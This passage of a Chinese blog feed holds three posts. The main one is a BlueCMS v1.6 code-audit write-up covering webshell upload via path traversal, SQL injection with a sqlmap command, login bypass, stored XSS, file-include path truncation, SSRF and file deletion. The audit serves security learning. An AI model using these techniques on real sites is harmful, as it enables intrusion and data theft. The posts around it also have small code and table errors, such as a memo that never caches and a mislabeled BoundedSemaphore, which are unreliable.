title="高楼扔鸡蛋"></a>高楼扔鸡蛋</h3><p>题目：</p><p>目前有一栋1到<code>N</code>共<code>N</code>层的楼，然后给你<code>K</code>鸡蛋（<code>K</code>至少为1），现在确定这栋楼存在楼层<code>0&lt;=F&lt;=N</code>,在这层楼将鸡蛋扔下去鸡蛋<strong>恰好没有碎</strong>（高于<code>F</code>的楼层都会碎，低于<code>F</code>的楼层都不会碎），现在问，最坏的情况下，你至少要扔多少次鸡蛋，才能确定这个楼层<code>F</code>？</p><h4 id="带备忘录的递归解法-3"><a href="#带备忘录的递归解法-3" class="headerlink" title="带备忘录的递归解法"></a>带备忘录的递归解法</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># K个鸡蛋,N层楼</span>    memo <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> K <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> N    <span class="token keyword">if</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> float<span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> N <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> min<span class="token punctuation">(</span>res<span class="token punctuation">,</span> max<span class="token punctuation">(</span>main<span class="token punctuation">(</span>K <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> main<span class="token punctuation">(</span>K<span class="token punctuation">,</span> N <span class="token operator">-</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 在max最坏的情况下，求min最优解，main(K - 1, i - 1)表示碎了，main(K, N - i)表示没碎</span>    memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> res    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h4 id="二分法优化"><a href="#二分法优化" class="headerlink" title="二分法优化"></a>二分法优化</h4><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># K个鸡蛋,N层楼</span>    memo <span class="token operator">=</span> dict<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> K <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> N    <span class="token keyword">if</span> N <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span> <span class="token keyword">in</span> memo<span class="token punctuation">:</span>        <span class="token keyword">return</span> memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> float<span class="token punctuation">(</span><span class="token string">"INF"</span><span class="token punctuation">)</span>    lo <span class="token operator">=</span> <span class="token number">1</span>    hi <span class="token operator">=</span> N    <span class="token keyword">while</span> lo <span class="token operator">&lt;=</span> hi<span class="token punctuation">:</span>        mid <span class="token operator">=</span> <span class="token punctuation">(</span>lo <span class="token operator">+</span> hi<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        broken <span class="token operator">=</span> main<span class="token punctuation">(</span>K <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> mid <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 碎</span>        not_broken <span class="token operator">=</span> main<span class="token punctuation">(</span>K<span class="token punctuation">,</span> N <span class="token operator">-</span> mid<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 没碎</span>        <span class="token comment" spellcheck="true"># res = min(max(碎, 没碎) + 1)</span>        <span class="token keyword">if</span> broken <span class="token operator">></span> not_broken<span class="token punctuation">:</span>            hi <span class="token operator">=</span> mid <span class="token operator">-</span> <span class="token number">1</span>            res <span class="token operator">=</span> min<span class="token punctuation">(</span>res<span class="token punctuation">,</span> broken <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            lo <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            res <span class="token operator">=</span> min<span class="token punctuation">(</span>res<span class="token punctuation">,</span> not_broken <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    memo<span class="token punctuation">[</span><span class="token punctuation">(</span>K<span class="token punctuation">,</span> N<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> res    <span class="token keyword">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>main<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>未完待续。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;斐波拉契数列&quot;&gt;&lt;a href=&quot;#斐波拉契数列&quot; class=&quot;headerlink&quot; title=&quot;斐波拉契数列&quot;&gt;&lt;/a&gt;斐波拉契数列&lt;/h3&gt;&lt;p&gt;&lt;code&gt;1,1,2,3,5,8,13...&lt;/code&gt;，状态转移方程：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://gitee.com/Extrader/blogimage/raw/master/image/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/image-20200421190059738.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="算法" scheme="https://www.extrader.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="python" scheme="https://www.extrader.top/tags/python/"/>
    
      <category term="算法" scheme="https://www.extrader.top/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>BlueCMS代码审计</title>
    <link href="https://www.extrader.top/2020/04/15/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://www.extrader.top/2020/04/15/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2020-04-15T03:22:30.000Z</published>
    <updated>2020-07-14T10:41:41.477Z</updated>
    
    <content type="html"><![CDATA[<p>“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的</p><p>BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的</p><a id="more"></a><h3 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h3><p>在后台有一个模板管理的功能，可以编辑前端htm文件</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101051793.png" alt="" loading="lazy"></p><p>点击编辑抓包</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101241645.png" alt="" loading="lazy"></p><p>可以看到包含了文件，于是我们尝试修改编辑的文件，改为<code>../../ann.php</code>，放包后如下，可以修改</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101419641.png" alt="" loading="lazy"></p><p>随后直接写马连接即可，源码如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200417101729886.png" alt="" loading="lazy"></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><h4 id="X-Forwarded-For头注入"><a href="#X-Forwarded-For头注入" class="headerlink" title="X-Forwarded-For头注入"></a>X-Forwarded-For头注入</h4><p>首先看到留言系统后台代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415164807809.png" alt="" loading="lazy"></p><p>网站习惯性的把用户留言时的ip保存下来，在看看getip()这个函数怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165228100.png" alt="" loading="lazy"></p><p>getenv()函数获取环境变量的值</p><ul><li>第一个HTTP_CLIENT_IP这个环境变量没有成标准，很多服务器完全没法获取</li><li>第二个X-Forwarded-For 这个东西可以通过HTTP请求头来修改。</li></ul><p>X-Forwarded-For明显可以伪造</p><p>抓包手工延时注入：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415165848020.png" alt="" loading="lazy"></p><p>然后写脚本跑就可以了</p><p>sqlmap跑数据库：<code>python sqlmap.py -r 1.txt --dbs --batch --headers=&quot;X-Forwarded-For:1*&quot;</code></p><p>可以把数据全跑出来</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415171800746.png" alt="" loading="lazy"></p><h4 id="首页登录界面SQL注入"><a href="#首页登录界面SQL注入" class="headerlink" title="首页登录界面SQL注入"></a>首页登录界面SQL注入</h4><p>先随便注册一个用户名为root的账号，然后在抓包使用万能密码即可登录任意用户</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134357459.png" alt="" loading="lazy"></p><p>再来看看源码中是怎么写的</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415134551779.png" alt="" loading="lazy"></p><p>只限制了管理员组的不能从前台登录，参数没经过任何的过滤。。。</p><h4 id="注册界面SQL注入"><a href="#注册界面SQL注入" class="headerlink" title="注册界面SQL注入"></a>注册界面SQL注入</h4><p>既然是注册界面就看肯定有插入数据到数据库中的操作，直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414102814136.png" alt="" loading="lazy"></p><p>简单的进行了用户和密码的检测，但并起不到实际的作用，于是在email处尝试进行报错注入，单引号闭合的时候能够成功插入到数据库中并没有报错，于是推测使用了魔术方法对用户的输入进行了转义，而sql语句编码方法使用的gbk编码，于是在单引号前面加上%df构成宽字节注入</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414104343110.png" alt="" loading="lazy"></p><p>成功报错但并没有显示出错误信息，查看源代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041411035197.png" alt="" loading="lazy"></p><p>似乎只会报sql语法错误，而我们报错注入使用的是XPATH上的语法错误，所以并不会显示出来，于是尝试盲注试试，尝试后视乎并没有执行成功，而是报了错误，原因不明，后面再研究</p><p>另外此处还有一个sql注入漏洞，可以插入多行用户数据，并且在email出嵌入sql语句，用户名单引号用十六进制代替</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121232230.png" alt="" loading="lazy"></p><p>可见成功执行注入，在数据库中成功执行了语句</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414121433047.png" alt="" loading="lazy"></p><h4 id="管理登录界面SQL注入"><a href="#管理登录界面SQL注入" class="headerlink" title="管理登录界面SQL注入"></a>管理登录界面SQL注入</h4><p>如下图，万能密码直接进了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416150916773.png" alt="" loading="lazy"></p><p>源码，无过滤</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416151154990.png" alt="" loading="lazy"></p><h4 id="ad-idSQL注入"><a href="#ad-idSQL注入" class="headerlink" title="ad_idSQL注入"></a>ad_idSQL注入</h4><p>直接看源码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153522230.png" alt="" loading="lazy"></p><p>应该存在联合查询注入，随后在第七个字段找到注入点，成功获取数据库名，随后再接着查表列就行了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416153652959.png" alt="" loading="lazy"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><h4 id="个人资料存储型xss"><a href="#个人资料存储型xss" class="headerlink" title="个人资料存储型xss"></a>个人资料存储型xss</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161529680.png" alt="" loading="lazy"></p><p>随后在个人界面和管理员用户界面完美弹窗，再看看数据库中的资料</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161646983.png" alt="" loading="lazy"></p><p>email和msn都嵌入了script代码，为啥其它的没用？因为表字段的长度只有那么长</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415161908634.png" alt="" loading="lazy"></p><p>再看看代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415162022292.png" alt="" loading="lazy"></p><p>同样未经过过滤，这里还存在sql注入漏洞，就不写了。</p><h4 id="注册界面存储型xss"><a href="#注册界面存储型xss" class="headerlink" title="注册界面存储型xss"></a>注册界面存储型xss</h4><p>注册界面的验证有部分是放在前端进行验证的，也就是用js进行验证，可我们都知道，前端验证并不可靠，真正的验证应该做在后端才行，就比如这里的邮箱验证就放在前端</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200414100621671.png" alt="" loading="lazy"></p><p>于是我们直接抓包绕过，并在email中注入恶意代码</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-2020041410074329.png" alt="" loading="lazy"></p><p>随后只要前端能够看得到该用户的邮箱，就会执行该恶意代码，就比如管理员的用户列表界面</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS代码审计/image-20200414101006315.png" style="zoom:80%;" / loading="lazy"><h4 id="发布新闻页面存储型XSS"><a href="#发布新闻页面存储型XSS" class="headerlink" title="发布新闻页面存储型XSS"></a>发布新闻页面存储型XSS</h4><p>先看下源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416113747952.png" alt="" loading="lazy"></p><p>content参数使用的是<code>filter_data</code>函数进行处理，而这个函数并没有过滤<code>img</code>标签，于是可以利用进行xss攻击</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416114042972.png" alt="" loading="lazy"></p><p>随后在新闻页面成功弹窗</p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><h4 id="备份信息泄露"><a href="#备份信息泄露" class="headerlink" title="备份信息泄露"></a>备份信息泄露</h4><p>管理员界面可以进行数据库备份，备份完后的数据放在这个目录下，并且命名规则为使用当日日期，可以尝试爆破地址</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200415173114792.png" alt="" loading="lazy"></p><p>访问即可下载sql文件，其中有用户的个人信息，密码经过了md5加密，弱密码的话直接就可以加密开了</p><h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>既然有文件包含漏洞自然少不了那四个<a href="https://www.extrader.top/2020/03/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/">文件包含</a>的操作，所以在找文件包含漏洞的时候就需要对这几个操作格外留意</p><h4 id="支付表单文件包含"><a href="#支付表单文件包含" class="headerlink" title="支付表单文件包含"></a>支付表单文件包含</h4><p>先在user.php中找到有<code>include</code>操作的代码，如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085302539.png" alt="" loading="lazy"></p><p>可以看到这里我们可以post一个pay参数，且pay参数我们可控，既然有文件包含了，自然就要找到文件上传的地方来包含这个文件来达到getshell的目的，在我们修改个人资料的界面就有上传头像的操作，于是我们上传图片马</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416085806794.png" alt="" loading="lazy"></p><p>得到路径，而这个文件包含操作在后面还加上了一个<code>/index.php</code>，这里就要根据为Windows下的文件最大路径来截取了，前提条件是php版本要小于<code>5.2.8</code>，Windows下目录最大长度为256字节，超出的部分会被丢弃，于是在提交act=pay的表单处提交一个<code>pay=../../data/upload/face_pic/15869440930.jpg......(超出256个字节)</code>，即可达到效果，由于我这没配php5.2.8的版本就不演示了</p><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><h4 id="修改用户头像处SSRF"><a href="#修改用户头像处SSRF" class="headerlink" title="修改用户头像处SSRF"></a>修改用户头像处SSRF</h4><p>源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120117255.png" alt="" loading="lazy"></p><p>这段代码是用来防止<code>http://</code>和<code>https://</code>链接的，但是使用的是弱比价，如果<code>strpos</code>返回的值为0，那么<code>0!=false</code>返回的是<code>false</code>即可绕过判断访问内网资源</p><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><h4 id="install无限安装"><a href="#install无限安装" class="headerlink" title="install无限安装"></a>install无限安装</h4><p>install目录是用来安装这个CMS的，但是在经过一次安装后再进入install系统并不会提示已经安装过或者要身份验证，于是就会造成无需任何提交就可以重新安装这个网站的风险，尽管管理员页面有提示（开发人员也有意识到），但如果使用者并没有在意就会造成极大的危害</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413184943343.png" alt="" loading="lazy"></p><h4 id="爆破用户名"><a href="#爆破用户名" class="headerlink" title="爆破用户名"></a>爆破用户名</h4><p>在输入用户名之后系统会自动发一个包到数据库去验证，如图所示</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413190358504.png" alt="" loading="lazy"></p><p>而这个查询并没有次数限制，于是就可以利用这个数据包传入的user_name值来爆破用户名，造成身份信息泄露</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200413185326945.png" alt="" loading="lazy"></p><h4 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h4><p>在修改会员的个人资料页面存在此漏洞，源码：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416120945046.png" alt="" loading="lazy"></p><p><code>face_pic3</code>可控，当<code>face_pic1</code>为空时即可删除<code>face_pic3</code>文件，如下</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/BlueCMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20200416121706429.png" alt="" loading="lazy"></p><p>可删除网站根目录下的1.txt文件</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/7074" target="_blank" rel="noopener">https://xz.aliyun.com/t/7074</a></li><li><a href="https://www.anquanke.com/post/id/178545" target="_blank" rel="noopener">https://www.anquanke.com/post/id/178545</a></li><li><a href="https://blog.csdn.net/WiCaTcRaZy/article/details/80444699" target="_blank" rel="noopener">https://blog.csdn.net/WiCaTcRaZy/article/details/80444699</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;“BlueCMS——第一款免费开源的专业地方门户系统，专注于地方门户的CMS！”  广告是这么打的&lt;/p&gt;
&lt;p&gt;BlueCMS v1.6 sp1，一个很老的CMS了，2010年的，上面的漏洞也很多，作为一个代码审计萌新的我，开始来拿这个练练手还是不错的&lt;/p&gt;
    
    </summary>
    
    
      <category term="源码审计" scheme="https://www.extrader.top/categories/%E6%BA%90%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="代码审计" scheme="https://www.extrader.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="CMS" scheme="https://www.extrader.top/tags/CMS/"/>
    
  </entry>
  
  <entry>
    <title>Python-多线程编程</title>
    <link href="https://www.extrader.top/2020/04/10/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/"/>
    <id>https://www.extrader.top/2020/04/10/Python-%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%BC%96%E7%A8%8B/</id>
    <published>2020-04-10T10:01:26.000Z</published>
    <updated>2020-07-14T10:44:10.345Z</updated>
    
    <content type="html"><![CDATA[<h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><p>可用对象列表</p><table><thead><tr><th align="center">对象</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">Thread</td><td align="center">表示一个执行线程的对象</td></tr><tr><td align="center">Lock</td><td align="center">锁原语对象</td></tr><tr><td align="center">RLock</td><td align="center">可重入锁对象，使单一的线程可以(再次)获得已持有的做(递归锁)</td></tr><tr><td align="center">Condition</td><td align="center">条件变量对象，使得一个线程等待另一个线程满足的特定的”条件”，比如改变状态或某个数据值</td></tr><tr><td align="center">Event</td><td align="center">条件变量的通用版本，任意数量的线程等待某个事件的发生，在该事件发生后所有的线程将被激活</td></tr><tr><td align="center">Semaphore</td><td align="center">为线程间共享的有限资源提供了一个”计数器”，如果没有可用资源时会被阻塞</td></tr><tr><td align="center">BoundedSemaphore</td><td align="center">与Semaphore相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Timer</td><td align="center">与Thread相似，不过它要在运行前等待一段时间</td></tr><tr><td align="center">Barrier</td><td align="center">创建一个”障碍”，必须达到指定数量的线程后才可以继续</td></tr></tbody></table><a id="more"></a><h3 id="Thread类"><a href="#Thread类" class="headerlink" title="Thread类"></a>Thread类</h3><p>Thread类是threading模块主要的执行对象</p><p><strong>Thread对象数据属性</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">线程名</td></tr><tr><td align="center">ident</td><td align="center">线程的标识符</td></tr><tr><td align="center">daemon</td><td align="center">布尔标志，表示这个线程是否是守护线程</td></tr></tbody></table><p><strong>Thread对象方法</strong></p><table><thead><tr><th align="center">属性</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>__init__(group=None,target=None,name=None,args=(),kwargs={},verbose=None,daemon=None)</code></td><td align="center">实例化一个线程对象，需要有一个可调用的target，以及其参数args或kwargs</td></tr><tr><td align="center">start()</td><td align="center">开始执行该线程</td></tr><tr><td align="center">run()</td><td align="center">定义线程功能的方法(通常在子类中被应用开发者重写)</td></tr><tr><td align="center">join(timeout=None)</td><td align="center">直至启动的线程终止之前一直挂起；除非给出了timeout(秒)，否则会一直阻塞</td></tr></tbody></table><p>下面看一段可创建多线程的代码</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> threading<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep<span class="token punctuation">,</span> ctimeloops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">loop</span><span class="token punctuation">(</span>nloop<span class="token punctuation">,</span> nsec<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"start loop"</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">"at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    sleep<span class="token punctuation">(</span>nsec<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"loop"</span><span class="token punctuation">,</span> nloop<span class="token punctuation">,</span> <span class="token string">"done at :"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"starting at:"</span><span class="token punctuation">,</span> ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    threads <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    nloops <span class="token operator">=</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>loops<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        t <span class="token operator">=</span> threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>loop<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>loops<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#target=需要线程去执行的方法名   args=线程执行方法接收的参数，该属性是一个元组，如果只有一个参数也需要在末尾加逗号</span>        threads<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#线程等待启动</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> nloops<span class="token punctuation">:</span>        threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 线程等待，主线程不会等待子线程执行完毕再结束自身，可使用Thread类的join()方法来让所有子线程执行完毕以后，主线程再关闭</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>threads<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"all DONE at:"</span><span class="token punctuation">,</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token 